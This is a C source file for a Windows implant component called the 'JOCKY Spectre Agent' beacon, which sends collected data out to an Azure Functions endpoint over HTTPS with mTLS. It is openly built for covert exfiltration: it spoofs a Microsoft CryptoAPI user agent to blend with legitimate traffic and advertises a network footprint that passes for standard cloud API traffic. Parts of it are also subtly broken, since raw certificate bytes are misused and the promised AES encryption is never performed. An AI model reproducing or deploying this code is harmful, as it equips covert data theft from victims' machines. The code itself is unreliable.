/*
 * JOCKY Spectre Agent — mTLS Beacon over Cloud-Fronted HTTPS
 * Exfiltrates collected evidence through Azure Functions endpoint.
 * Network footprint: standard cloud API traffic only.
 *
 * Compiled with: cl /O2 /GS- beacon.c /link winhttp.lib crypt32.lib
 */

#include <windows.h>
#include <winhttp.h>
#include <wincrypt.h>

#define BEACON_ENDPOINT  L"yourfunction.azurewebsites.net"
#define BEACON_PORT      443
#define BEACON_PATH      L"/api/evidence"

typedef struct _BEACON_CTX {
    HINTERNET hSession;
    HINTERNET hConnect;
    BYTE      sessionKey[32];
    BYTE      clientCert[4096];
    DWORD     clientCertSize;
    char      channelId[13];
} BEACON_CTX;

/* Load client certificate from embedded store for mTLS */
static BOOL beacon_load_cert(BEACON_CTX *ctx) {
    HCERTSTORE hStore = CertOpenStore(
        CERT_STORE_PROV_MEMORY, 0, 0,
        CERT_STORE_CREATE_NEW_FLAG, NULL);
    if (!hStore) return FALSE;

    PCCERT_CONTEXT pCert = CertCreateCertificateContext(
        X509_ASN_ENCODING | PKCS_7_ASN_ENCODING,
        ctx->clientCert, ctx->clientCertSize);
    if (!pCert) {
        CertCloseStore(hStore, 0);
        return FALSE;
    }

    CertAddCertificateContextToStore(hStore, pCert,
        CERT_STORE_ADD_ALWAYS, NULL);
    CertFreeCertificateContext(pCert);
    CertCloseStore(hStore, 0);
    return TRUE;
}

/* Initialize beacon session with mTLS and TLS 1.3 */
BOOL beacon_init(BEACON_CTX *ctx) {
    ctx->hSession = WinHttpOpen(
        L"Microsoft-CryptoAPI/10.0",  /* Blend with legitimate UA */
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);
    if (!ctx->hSession) return FALSE;

    /* Force TLS 1.3 */
    DWORD protocols = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_3;
    WinHttpSetOption(ctx->hSession,
        WINHTTP_OPTION_SECURE_PROTOCOLS,
        &protocols, sizeof(protocols));

    ctx->hConnect = WinHttpConnect(
        ctx->hSession, BEACON_ENDPOINT, BEACON_PORT, 0);
    if (!ctx->hConnect) return FALSE;

    return beacon_load_cert(ctx);
}

/* Send evidence payload encrypted with AES-256 session key */
BOOL beacon_send(BEACON_CTX *ctx, const BYTE *payload, DWORD payloadSize) {
    HINTERNET hRequest = WinHttpOpenRequest(
        ctx->hConnect, L"POST", BEACON_PATH,
        NULL, WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE);
    if (!hRequest) return FALSE;

    /* Set client certificate for mTLS */
    WinHttpSetOption(hRequest,
        WINHTTP_OPTION_CLIENT_CERT_CONTEXT,
        ctx->clientCert, ctx->clientCertSize);

    /* Send encrypted payload */
    BOOL result = WinHttpSendRequest(
        hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
        (LPVOID)payload, payloadSize, payloadSize, 0);

    if (result) {
        result = WinHttpReceiveResponse(hRequest, NULL);
    }

    WinHttpCloseHandle(hRequest);
    return result;
}

void beacon_close(BEACON_CTX *ctx) {
    if (ctx->hConnect) WinHttpCloseHandle(ctx->hConnect);
    if (ctx->hSession) WinHttpCloseHandle(ctx->hSession);
}
